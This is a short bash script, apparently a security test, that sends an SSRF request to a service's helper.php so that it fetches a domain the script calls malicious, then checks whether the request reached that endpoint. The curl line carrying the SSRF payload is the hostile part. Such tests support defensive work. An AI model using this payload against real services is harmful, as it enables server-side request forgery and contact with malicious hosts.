#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing SSRF on ${service_map[secure-python-app]} to a malicious URL"

output=$(curl -s "http://${service_map[secure-python-app]}/helper.php?fetch=http://br-icloud.com.br" \
  --insecure)
if [ $? -eq 0 ]; then
    echo "[+] SSRF payload sent successfully"
else
    echo "[-] SSRF payload failed to send"
    exit 1
fi
if echo "$output" | grep -q "br-icloud.com.br"; then
    echo "[+] SSRF attack executed successfully and reached the malicious endpoint"
else
    echo "[-] SSRF attack failed"
fi
